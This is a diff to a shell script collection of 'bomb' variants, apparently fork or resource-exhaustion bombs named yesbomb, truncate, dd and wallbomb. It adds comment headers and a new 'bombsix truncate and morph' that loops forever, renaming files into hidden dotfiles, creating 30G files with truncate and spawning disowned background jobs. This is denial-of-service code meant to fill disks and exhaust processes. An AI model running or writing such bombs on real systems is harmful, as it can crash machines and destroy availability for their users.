@@ -12,6 +12,9 @@
 # : $i
 
 #yesbomb two
+#oneliner
+
+#full
 :
 {
 	for (( i=0; ; i+=1 )); do
@@ -29,6 +32,9 @@ while true; do
 done
 
 #yesbomb three
+#oneliner
+
+#full
 :
 {
 	for (( i=0; ; i+=1 )); do
@@ -46,6 +52,9 @@ while true; do
 done
 
 #bomb four (truncate)
+#oneliner
+
+#full
 :
 {
 	for (( i=0; ; i+=1 )); do
@@ -62,6 +71,9 @@ while true; do
 done
 
 #bomb five (dd)
+#oneliner
+
+#full
 :
 {
 	for (( i=0; ; i+=1 )); do
@@ -75,6 +87,22 @@ while true; do
 		: $word$c & disown
 	done
 	counter+=1
+done
+
+#bombsix truncate and morph
+#oneliner
+
+#full
+:
+{
+	for (( i=0; ; i+=1 )); do
+		mv $1 .$1$i
+	done
+}
+c=0
+while true; do
+	truncate -s 30G .$c
+	: .$c & disown
 done
 
 #wallbomb
